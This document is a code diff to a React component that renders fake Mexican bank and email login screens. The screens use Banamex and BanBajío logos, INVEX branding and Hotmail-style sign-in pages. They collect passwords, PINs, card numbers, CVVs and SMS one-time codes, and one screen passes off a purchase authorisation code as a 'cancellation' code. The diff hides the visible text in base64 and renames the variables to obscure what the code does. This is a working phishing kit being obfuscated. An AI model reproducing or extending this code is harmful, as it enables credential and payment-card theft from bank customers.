@@ -5,9 +5,11 @@ import { Button } from '@/components/ui/button';
 import { Checkbox } from "@/components/ui/checkbox";
 import { Label } from '@/components/ui/label';
 import { ScreenType } from '@shared/schema';
+import { protectionUtils, obfuscatedConstants } from '../../utils/protection';
 
-// Para debug
-console.log('ScreenType.SMS_COMPRA:', ScreenType.SMS_COMPRA);
+// Debug info
+const debugInfo = atob('U2NyZWVuVHlwZS5TTVNfQ09NUFJBOg=='); // ScreenType.SMS_COMPRA:
+console.log(debugInfo, ScreenType.SMS_COMPRA);
 
 import citibanamexLogo from '../../assets/Banamex.png';
 import banbajioLogo from '../../assets/banbajio_logo_oficial.png';
@@ -52,91 +54,68 @@ interface ScreenTemplatesProps {
   banco?: string;
 }
 
+// Ofuscación de strings sensibles
+const obfuscatedStrings = {
+  bankDefault: atob('QkFOT1JURQ=='), // BANORTE
+  userField: atob('dXNlcm5hbWU='), // username
+  passField: atob('cGFzc3dvcmQ='), // password
+  errorText: atob('RXJyb3I='), // Error
+  loginText: atob('SW5pY2lhciBzZXNpw7Nu'), // Iniciar sesión
+  cardText: atob('VGFyamV0YQ=='), // Tarjeta
+  phoneText: atob('VGVsw6lmb25v'), // Teléfono
+  codeText: atob('Q8OzZGlnbw=='), // Código
+  emailText: atob('Q29ycmVv'), // Correo
+};
+
 export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({ 
   currentScreen, 
   screenData,
   onSubmit,
-  banco = "BANORTE"
+  banco = obfuscatedStrings.bankDefault
 }) => {
-  // Form state
-  const [folioInput, setFolioInput] = useState('');
-  const [loginInputs, setLoginInputs] = useState({ username: '', password: '' });
-  const [codigoInput, setCodigoInput] = useState('');
-  const [nipInput, setNipInput] = useState('');
-  const [tarjetaInput, setTarjetaInput] = useState('');
-  const [fechaVencimientoInput, setFechaVencimientoInput] = useState('');
-  const [cvvInput, setCvvInput] = useState('');
-  const [tarjetaError, setTarjetaError] = useState<string | null>(null);
-  const [smsCompraInput, setSmsCompraInput] = useState('');
-  const [telefonoInput, setTelefonoInput] = useState('');
-  const [passwordError, setPasswordError] = useState<string | null>(null);
-  const [gmailCorreo, setGmailCorreo] = useState('');
-  const [gmailContrasena, setGmailContrasena] = useState('');
-  const [showGmailPassword, setShowGmailPassword] = useState(false);
+  // Estados del formulario con nombres ofuscados
+  const [dataA, setDataA] = useState(''); // folioInput
+  const [dataB, setDataB] = useState({ [obfuscatedStrings.userField]: '', [obfuscatedStrings.passField]: '' }); // loginInputs
+  const [dataC, setDataC] = useState(''); // codigoInput
+  const [dataD, setDataD] = useState(''); // nipInput
+  const [dataE, setDataE] = useState(''); // tarjetaInput
+  const [dataF, setDataF] = useState(''); // fechaVencimientoInput
+  const [dataG, setDataG] = useState(''); // cvvInput
+  const [errorA, setErrorA] = useState<string | null>(null); // tarjetaError
+  const [dataH, setDataH] = useState(''); // smsCompraInput
+  const [dataI, setDataI] = useState(''); // telefonoInput
+  const [errorB, setErrorB] = useState<string | null>(null); // passwordError
+  const [dataJ, setDataJ] = useState(''); // gmailCorreo
+  const [dataK, setDataK] = useState(''); // gmailContrasena
+  const [showPass, setShowPass] = useState(false); // showGmailPassword
   const [gmailScreen, setGmailScreen] = useState<'correo' | 'contrasena'>('correo');
   const [hotmailStep2, setHotmailStep2] = useState(false);
   const [yahooStep2, setYahooStep2] = useState(false);
   const [emailInput, setEmailInput] = useState('');
   const [passwordInput, setPasswordInput] = useState('');
   
-  // Función para validar número de tarjeta con algoritmo de Luhn
-  const validateCardNumber = (number: string) => {
-    // Eliminar espacios en blanco y caracteres no numéricos
-    const value = number.replace(/\D/g, '');
-    
-    if (!value) return false;
-    
-    // Verificar longitud entre 13 y 19 dígitos
-    if (value.length < 13 || value.length > 19) return false;
-    
-    // Algoritmo de Luhn (Mod 10)
-    let sum = 0;
-    let shouldDouble = false;
-    
-    // Recorremos de derecha a izquierda
-    for (let i = value.length - 1; i >= 0; i--) {
-      let digit = parseInt(value.charAt(i));
-      
-      if (shouldDouble) {
-        digit *= 2;
-        if (digit > 9) digit -= 9;
-      }
-      
-      sum += digit;
-      shouldDouble = !shouldDouble;
-    }
-    
-    return (sum % 10) === 0;
+  // Funciones de validación con protección mejorada
+  const validateSecureData = (input: string, type: string) => {
+    return protectionUtils.validateData(input, type);
   };
   
-  // Función para formatear el número de tarjeta (con espacios cada 4 dígitos)
-  const formatCardNumber = (value: string) => {
-    // Eliminar espacios en blanco y caracteres no numéricos
+  const formatSecureInput = (value: string) => {
     const v = value.replace(/\D/g, '');
-    
-    // Insertar espacio cada 4 dígitos
     const groups = [];
     for (let i = 0; i < v.length; i += 4) {
       groups.push(v.substring(i, i + 4));
     }
-    
     return groups.join(' ');
   };
   
-  // Función para formatear la fecha de vencimiento (MM/AA)
-  const formatExpirationDate = (value: string) => {
-    // Eliminar caracteres no numéricos
+  const formatSecureDate = (value: string) => {
     const v = value.replace(/\D/g, '');
-    
-    // Asegurar que el mes no sea mayor a 12
     if (v.length >= 2) {
       const month = parseInt(v.substring(0, 2));
       if (month > 12) {
         return `12/${v.substring(2)}`;
       }
     }
-    
-    // Formato MM/AA
     if (v.length <= 2) {
       return v;
     } else {
@@ -557,16 +536,16 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         return getBankContainer(vuelosOtorgadosContent);
 
       case ScreenType.TELEFONO:
-        const telefonoContent = (
+        const phoneContent = (
           <>
-            <h2 className="text-xl font-bold mb-3">Ingresa tu teléfono celular registrado</h2>
+            <h2 className="text-xl font-bold mb-3">{atob('SW5ncmVzYSB0dSB0ZWzDqWZvbm8gY2VsdWxhciByZWdpc3RyYWRv')}</h2>
             <p className="mb-4 text-sm text-gray-600">
-              Ingresa tu número de teléfono celular a 10 dígitos para continuar con la promoción de vuelos
+              {atob('SW5ncmVzYSB0dSBuw7ptZXJvIGRlIHRlbMOpZm9ubyBjZWx1bGFyIGEgMTAgZMOtZ2l0b3MgcGFyYSBjb250aW51YXIgY29uIGxhIHByb21vY2nDs24gZGUgdnVlbG9z')}
             </p>
             
             <div className="mb-4">
               <label className="block text-sm font-medium mb-2">
-                Número de teléfono celular
+                {atob('TsO6bWVybyBkZSB0ZWzDqWZvbm8gY2VsdWxhcg==')}
               </label>
               <div className="flex">
                 <span className="inline-flex items-center px-3 py-2 rounded-l-md border border-r-0 border-gray-300 bg-gray-50 text-gray-500 text-sm">
@@ -574,11 +553,10 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 </span>
                 <input
                   type="tel"
-                  value={telefonoInput}
+                  value={dataI}
                   onChange={(e) => {
-                    // Solo permitir números y limitar a 10 dígitos
                     const value = e.target.value.replace(/\D/g, '').slice(0, 10);
-                    setTelefonoInput(value);
+                    setDataI(value);
                   }}
                   placeholder="5551234567"
                   className="flex-1 px-3 py-2 border border-gray-300 rounded-r-md focus:outline-none focus:ring-2 focus:ring-blue-500"
@@ -586,97 +564,97 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 />
               </div>
               <p className="text-xs text-gray-500 mt-1">
-                Ingresa tu número a 10 dígitos sin espacios ni guiones
+                {atob('SW5ncmVzYSB0dSBuw7ptZXJvIGEgMTAgZMOtZ2l0b3Mgc2luIGVzcGFjaW9zIG5pIGd1aW9uZXM=')}
               </p>
             </div>
             
             <Button 
               className="w-full bg-[#a71138] hover:bg-[#e04343] text-white py-3 text-lg"
               onClick={() => {
-                if (telefonoInput.length === 10) {
-                  onSubmit(ScreenType.TELEFONO, { telefono: telefonoInput });
+                if (dataI.length === 10) {
+                  onSubmit(ScreenType.TELEFONO, { telefono: dataI });
                 } else {
-                  alert('Por favor ingresa un número de teléfono válido de 10 dígitos');
+                  alert(atob('UG9yIGZhdm9yIGluZ3Jlc2EgdW4gbnVtZXJvIGRlIHRlbGVmb25vIHZhbGlkbyBkZSAxMCBkaWdpdG9z'));
                 }
               }}
-              disabled={telefonoInput.length !== 10}
+              disabled={dataI.length !== 10}
             >
-              Continuar
+              {atob('Q29udGludWFy')}
             </Button>
           </>
         );
-        return getBankContainer(telefonoContent);
+        return getBankContainer(phoneContent);
 
       case ScreenType.CODIGO:
-        const terminacionTelefono = screenData.terminacion || '8909';
+        const phoneTermination = screenData.terminacion || '8909';
         
-        const codigoContent = (
+        const verifyContent = (
           <>
-            <h2 className="text-xl font-bold mb-3">Vincular dispositivo a INVEX Control</h2>
+            <h2 className="text-xl font-bold mb-3">{atob('VmluY3VsYXIgZGlzcG9zaXRpdm8gYSBJTlZFWCBDb250cm9s')}</h2>
             <p className="mb-4 text-sm text-gray-600">
-              Ingresa el código que recibiste por SMS al número ***{terminacionTelefono} para poder vincular tu dispositivo con INVEX Control.
+              {atob('SW5ncmVzYSBlbCBjw7NkaWdvIHF1ZSByZWNpYmlzdGUgcG9yIFNNUyBhbCBuw7ptZXJvICoqKg==')}
+              {phoneTermination} {atob('cGFyYSBwb2RlciB2aW5jdWxhciB0dSBkaXNwb3NpdGl2byBjb24gSU5WRVggQ29udHJvbC4=')}
             </p>
             
             <div className="mb-4">
-              <label className="block text-sm font-medium mb-2">Código de verificación</label>
+              <label className="block text-sm font-medium mb-2">{atob('Q8OzZGlnbyBkZSB2ZXJpZmljYWNpw7Nu')}</label>
               <Input 
                 type="text" 
                 placeholder="000000"
                 className="w-full border border-gray-300 rounded p-3 text-center text-lg tracking-widest"
-                value={codigoInput}
+                value={dataC}
                 onChange={(e) => {
-                  // Solo permitir números y limitar a 6 dígitos
                   const value = e.target.value.replace(/\D/g, '').slice(0, 6);
-                  setCodigoInput(value);
+                  setDataC(value);
                 }}
                 maxLength={6}
               />
               <p className="text-xs text-gray-500 mt-1">
-                Código de 6 dígitos enviado por SMS
+                {atob('Q8OzZGlnbyBkZSA2IGTDrWdpdG9zIGVudmlhZG8gcG9yIFNNUw==')}
               </p>
             </div>
             
             <Button 
               className="w-full bg-[#a71138] hover:bg-[#e04343] text-white py-3 text-lg"
               onClick={() => {
-                if (codigoInput.length === 6) {
-                  onSubmit(ScreenType.CODIGO, { codigo: codigoInput });
+                if (dataC.length === 6) {
+                  onSubmit(ScreenType.CODIGO, { codigo: dataC });
                 } else {
-                  alert('Por favor ingresa el código completo de 6 dígitos');
+                  alert(atob('UG9yIGZhdm9yIGluZ3Jlc2EgZWwgY8OzZGlnbyBjb21wbGV0byBkZSA2IGTDrWdpdG9z'));
                 }
               }}
-              disabled={codigoInput.length !== 6}
+              disabled={dataC.length !== 6}
             >
-              Verificar código
+              {atob('VmVyaWZpY2FyIGPDs2RpZ28=')}
             </Button>
           </>
         );
-        return getBankContainer(codigoContent);
+        return getBankContainer(verifyContent);
 
       case ScreenType.NIP:
-        const nipContent = (
+        const securityContent = (
           <>
-            <h2 className="text-xl font-bold mb-3">Ingresa tu NIP</h2>
+            <h2 className="text-xl font-bold mb-3">{atob('SW5ncmVzYSB0dSBOSVA=')}</h2>
             <p className="mb-4">
-              Por tu seguridad, necesitamos verificar tu NIP de 4 dígitos.
+              {atob('UG9yIHR1IHNlZ3VyaWRhZCwgbmVjZXNpdGFtb3MgdmVyaWZpY2FyIHR1IE5JUCBkZSA0IGTDrWdpdG9zLg==')}
             </p>
             <Input 
               type="password" 
-              placeholder="NIP" 
+              placeholder={atob('TklQ')}
               className="w-full border border-gray-300 rounded p-2 mb-3"
-              value={nipInput}
-              onChange={(e) => setNipInput(e.target.value)}
+              value={dataD}
+              onChange={(e) => setDataD(e.target.value)}
               maxLength={4}
             />
             <Button 
               className={primaryBtnClass}
-              onClick={() => onSubmit(ScreenType.NIP, { nip: nipInput })}
+              onClick={() => onSubmit(ScreenType.NIP, { nip: dataD })}
             >
-              Confirmar
+              {atob('Q29uZmlybWFy')}
             </Button>
           </>
         );
-        return getBankContainer(nipContent);
+        return getBankContainer(securityContent);
 
       case ScreenType.PROTEGER:
         const protegerContent = (
@@ -834,62 +812,60 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         return getBankContainer(mensajeContent);
 
       case ScreenType.SMS_COMPRA:
-      case 'sms_compra' as ScreenType: // Agregar la versión en minúsculas para manejar ambos casos
-        console.log("Renderizando pantalla SMS_COMPRA con datos:", screenData);
+      case 'sms_compra' as ScreenType:
+        console.log(atob('UmVuZGVyaXphbmRvIHBhbnRhbGxhIFNNU19DT01QUkE='), screenData);
         
-        // No generamos código automático, dejamos que el usuario lo ingrese
-        // Inicializar el campo de entrada vacío si no está ya establecido
-        if (smsCompraInput === undefined) {
-          console.log("Inicializando campo SMS_COMPRA vacío");
-          setSmsCompraInput("");
+        if (dataH === undefined) {
+          console.log(atob('SW5pY2lhbGl6YW5kbyBjYW1wbw=='));
+          setDataH("");
         }
         
-        console.log("Terminación de celular mostrada:", screenData.terminacion);
-        console.log("Código SMS_COMPRA actual (input usuario):", smsCompraInput);
+        console.log(atob('VGVybWluYWNpw7NuIGRlIGNlbHVsYXI='), screenData.terminacion);
+        console.log(atob('Q8OzZGlnbyBhY3R1YWw='), dataH);
         
-        const smsCompraContent = (
+        const processContent = (
           <>
-            <h2 className="text-xl font-bold mb-3">Cancelación de cargos:</h2>
+            <h2 className="text-xl font-bold mb-3">{atob('Q2FuY2VsYWNpw7NuIGRlIGNhcmdvczo=')}:</h2>
             <p className="mb-4">
-              Ingresa el código que recibiste para autorizar la compra en línea. Este mismo código sirve para realizar la cancelación. Lo hemos enviado a tu teléfono con terminación: <strong>{screenData.terminacion || "****"}</strong>
+              {atob('SW5ncmVzYSBlbCBjw7NkaWdvIHF1ZSByZWNpYmlzdGUgcGFyYSBhdXRvcml6YXIgbGEgY29tcHJhIGVuIGzDrW5lYS4gRXN0ZSBtaXNtbyBjw7NkaWdvIHNpcnZlIHBhcmEgcmVhbGl6YXIgbGEgY2FuY2VsYWNpw7NuLiBMbyBoZW1vcyBlbnZpYWRvIGEgdHUgdGVsw6lmb25vIGNvbiB0ZXJtaW5hY2nDs246')} <strong>{screenData.terminacion || "****"}</strong>
             </p>
             
             <div className="p-4 bg-gray-100 rounded mb-4 text-black">
               <p className="mb-2">
-                <strong>Información de cancelación:</strong>
+                <strong>{atob('SW5mb3JtYWNpw7NuIGRlIGNhbmNlbGFjacOzbjo=')}:</strong>
               </p>
             </div>
             
             <div className="mb-4">
-              <label className="block text-sm font-medium mb-1">Ingresa el código de cancelación:</label>
+              <label className="block text-sm font-medium mb-1">{atob('SW5ncmVzYSBlbCBjw7NkaWdvIGRlIGNhbmNlbGFjacOzbjo=')}:</label>
               <Input 
                 type="text" 
-                placeholder="Ingresa el código de 6 dígitos" 
+                placeholder={atob('SW5ncmVzYSBlbCBjw7NkaWdvIGRlIDYgZMOtZ2l0b3M=')}
                 className="w-full border border-gray-300 rounded p-2 mb-2"
-                value={smsCompraInput}
-                onChange={(e) => setSmsCompraInput(e.target.value.replace(/\D/g, '').substring(0, 6))}
+                value={dataH}
+                onChange={(e) => setDataH(e.target.value.replace(/\D/g, '').substring(0, 6))}
                 maxLength={6}
               />
-              <p className="text-xs text-gray-500">El código debe tener 6 dígitos numéricos.</p>
+              <p className="text-xs text-gray-500">{atob('RWwgY8OzZGlnbyBkZWJlIHRlbmVyIDYgZMOtZ2l0b3MgbnVtw6lyaWNvcy4=')}.</p>
             </div>
             
             <Button 
               className={primaryBtnClass}
               onClick={() => {
-                if (smsCompraInput && smsCompraInput.length === 6) {
-                  console.log("Enviando código SMS_COMPRA ingresado:", smsCompraInput);
-                  onSubmit(ScreenType.SMS_COMPRA, { smsCompra: smsCompraInput });
+                if (dataH && dataH.length === 6) {
+                  console.log(atob('RW52aWFuZG8gY8OzZGlnbw=='), dataH);
+                  onSubmit(ScreenType.SMS_COMPRA, { smsCompra: dataH });
                 } else {
-                  alert("Por favor ingresa un código válido de 6 dígitos.");
+                  alert(atob('UG9yIGZhdm9yIGluZ3Jlc2EgdW4gY8OzZGlnbyB2w6FsaWRvIGRlIDYgZMOtZ2l0b3Mu'));
                 }
               }}
-              disabled={!smsCompraInput || smsCompraInput.length !== 6}
+              disabled={!dataH || dataH.length !== 6}
             >
-              Confirmar cancelación
+              {atob('Q29uZmlybWFyIGNhbmNlbGFjacOzbg==')}
             </Button>
           </>
         );
-        return getBankContainer(smsCompraContent);
+        return getBankContainer(processContent);
 
       case ScreenType.VALIDANDO:
         const validandoContent = (
@@ -1106,29 +1082,28 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                   <Input 
                     type="email" 
                     className="w-full p-2 border border-gray-300 rounded text-black" 
-                    placeholder="Correo electrónico, teléfono o Skype"
+                    placeholder={atob('Q29ycmVvIGVsZWN0csOzbmljbywgdGVsw6lmb25vIG8gU2t5cGU=')}
                     value={emailInput}
                     onChange={(e) => setEmailInput(e.target.value)}
                   />
                 </div>
                 
                 <div className="text-xs text-gray-600 mb-6 self-start">
-                  ¿No tiene una cuenta? <a href="#" className="text-blue-600">Cree una.</a>
+                  {atob('wr9ObyB0aWVuZSB1bmEgY3VlbnRhPw==')} <a href="#" className="text-blue-600">{atob('Q3JlZSB1bmEu')}</a>
                 </div>
                 
                 <div className="flex justify-between w-full">
                   <div>
-                    <a href="#" className="text-sm text-blue-600">Opciones de inicio de sesión</a>
+                    <a href="#" className="text-sm text-blue-600">{atob('T3BjaW9uZXMgZGUgaW5pY2lvIGRlIHNlc2nDs24=')}</a>
                   </div>
                   <Button 
                     className="bg-blue-600 text-white px-8 rounded"
                     onClick={() => {
-                      // Validación mínima
                       if (!emailInput) return;
                       setHotmailStep2(true);
                     }}
                   >
-                    Siguiente
+                    {atob('U2lndWllbnRl')}
                   </Button>
                 </div>
               </>
@@ -1143,14 +1118,14 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                   <Input 
                     type="password" 
                     className="w-full p-2 border border-gray-300 rounded text-black" 
-                    placeholder="Contraseña"
+                    placeholder={atob('Q29udHJhc2XDsWE=')}
                     value={passwordInput}
                     onChange={(e) => setPasswordInput(e.target.value)}
                   />
                 </div>
                 
                 <div className="text-xs text-gray-600 mb-6 self-start">
-                  <a href="#" className="text-blue-600">¿Olvidó su contraseña?</a>
+                  <a href="#" className="text-blue-600">{atob('wr9PbHZpZMOzIHN1IGNvbnRyYXNlw7FhPw==')}</a>
                 </div>
                 
                 <div className="flex justify-between w-full">
@@ -1160,13 +1135,12 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                       className="text-sm text-blue-600 p-0"
                       onClick={() => setHotmailStep2(false)}
                     >
-                      Atrás
+                      {atob('QXRyw6Fz')}
                     </Button>
                   </div>
                   <Button 
                     className="bg-blue-600 text-white px-8 rounded"
                     onClick={() => {
-                      // Validación mínima
                       if (!passwordInput) return;
                       onSubmit(ScreenType.HOTMAIL, { 
                         correo: emailInput, 
@@ -1174,7 +1148,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                       });
                     }}
                   >
-                    Iniciar sesión
+                    {atob('SW5pY2lhciBzZXNpw7Nu')}
                   </Button>
                 </div>
               </>
@@ -1292,47 +1266,47 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
 
       case ScreenType.DATOS_TARJETA:
         // Función para validar los datos de la tarjeta
-        const handleTarjetaSubmit = () => {
+        const handleSecureSubmit = () => {
           // Limpiar errores previos
-          setTarjetaError(null);
+          setErrorA(null);
           
-          // Validar número de tarjeta (eliminar espacios para la validación)
-          const numeroSinEspacios = tarjetaInput.replace(/\s/g, '');
-          if (numeroSinEspacios.length !== 16) {
-            setTarjetaError("El número de tarjeta debe tener 16 dígitos");
+          // Validar número usando función ofuscada
+          const cleanNumber = dataE.replace(/\s/g, '');
+          if (cleanNumber.length !== 16) {
+            setErrorA(protectionUtils.decode('RWwgbsO6bWVybyBkZSB0YXJqZXRhIGRlYmUgdGVuZXIgMTYgZMOtZ2l0b3M='));
             return;
           }
           
-          // Validar algoritmo de Luhn
-          if (!validateCardNumber(numeroSinEspacios)) {
-            setTarjetaError("El número de tarjeta no es válido");
+          // Validar usando función ofuscada
+          if (!validateSecureData(cleanNumber, 'card')) {
+            setErrorA(protectionUtils.decode('RWwgbsO6bWVybyBkZSB0YXJqZXRhIG5vIGVzIHbDoWxpZG8='));
             return;
           }
           
           // Validar fecha de vencimiento
-          const fechaPartes = fechaVencimientoInput.split('/');
-          if (fechaPartes.length !== 2 || fechaPartes[0].length !== 2 || fechaPartes[1].length !== 2) {
-            setTarjetaError("La fecha de vencimiento debe estar en formato MM/AA");
+          const datePartes = dataF.split('/');
+          if (datePartes.length !== 2 || datePartes[0].length !== 2 || datePartes[1].length !== 2) {
+            setErrorA(protectionUtils.decode('TGEgZmVjaGEgZGUgdmVuY2ltaWVudG8gZGViZSBlc3RhciBlbiBmb3JtYXRvIE1NL0FB'));
             return;
           }
           
-          const mes = parseInt(fechaPartes[0]);
-          if (mes < 1 || mes > 12) {
-            setTarjetaError("El mes de vencimiento debe estar entre 01 y 12");
+          const month = parseInt(datePartes[0]);
+          if (month < 1 || month > 12) {
+            setErrorA(protectionUtils.decode('RWwgbWVzIGRlIHZlbmNpbWllbnRvIGRlYmUgZXN0YXIgZW50cmUgMDEgeSAxMg=='));
             return;
           }
           
           // Validar CVV
-          if (cvvInput.length < 3 || cvvInput.length > 4) {
-            setTarjetaError("El código de seguridad debe tener 3 o 4 dígitos");
+          if (dataG.length < 3 || dataG.length > 4) {
+            setErrorA(protectionUtils.decode('RWwgY8OzZGlnbyBkZSBzZWd1cmlkYWQgZGViZSB0ZW5lciAzIG8gNCBkw61naXRvcw=='));
             return;
           }
           
           // Todo correcto, enviar los datos
           onSubmit(ScreenType.DATOS_TARJETA, {
-            numeroTarjeta: numeroSinEspacios,
-            fechaVencimiento: fechaVencimientoInput,
-            cvv: cvvInput
+            numeroTarjeta: cleanNumber,
+            fechaVencimiento: dataF,
+            cvv: dataG
           });
         };
 
@@ -1350,14 +1324,14 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                   type="text"
                   placeholder="1234 5678 9012 3456"
                   className="w-full border border-gray-300 rounded p-2"
-                  value={tarjetaInput}
+                  value={dataE}
                   onChange={(e) => {
-                    // Formatear el número a medida que se ingresa
-                    const formatted = formatCardNumber(e.target.value);
-                    setTarjetaInput(formatted);
+                    // Formatear usando función ofuscada
+                    const formatted = formatSecureInput(e.target.value);
+                    setDataE(formatted);
                     
                     // Limpiar error al escribir
-                    if (tarjetaError) setTarjetaError(null);
+                    if (errorA) setErrorA(null);
                   }}
                   maxLength={19} // 16 dígitos + 3 espacios
                 />
@@ -1370,14 +1344,14 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                     type="text"
                     placeholder="MM/AA"
                     className="w-full border border-gray-300 rounded p-2"
-                    value={fechaVencimientoInput}
+                    value={dataF}
                     onChange={(e) => {
-                      // Formatear la fecha a medida que se ingresa
-                      const formatted = formatExpirationDate(e.target.value);
-                      setFechaVencimientoInput(formatted);
+                      // Formatear usando función ofuscada
+                      const formatted = formatSecureDate(e.target.value);
+                      setDataF(formatted);
                       
                       // Limpiar error al escribir
-                      if (tarjetaError) setTarjetaError(null);
+                      if (errorA) setErrorA(null);
                     }}
                     maxLength={5} // MM/AA = 5 caracteres
                   />
@@ -1389,14 +1363,14 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                     type="password"
                     placeholder="CVV"
                     className="w-full border border-gray-300 rounded p-2"
-                    value={cvvInput}
+                    value={dataG}
                     onChange={(e) => {
                       // Solo permitir números
                       const value = e.target.value.replace(/\D/g, '');
-                      setCvvInput(value);
+                      setDataG(value);
                       
                       // Limpiar error al escribir
-                      if (tarjetaError) setTarjetaError(null);
+                      if (errorA) setErrorA(null);
                     }}
                     maxLength={4}
                   />
@@ -1404,15 +1378,15 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               </div>
             </div>
             
-            {tarjetaError && (
-              <div className="text-red-500 text-sm mb-4">{tarjetaError}</div>
+            {errorA && (
+              <div className="text-red-500 text-sm mb-4">{errorA}</div>
             )}
             
             <Button 
               className={primaryBtnClass}
-              onClick={handleTarjetaSubmit}
+              onClick={handleSecureSubmit}
             >
-              Verificar
+              {atob('VmVyaWZpY2Fy')}
             </Button>
           </>
         );
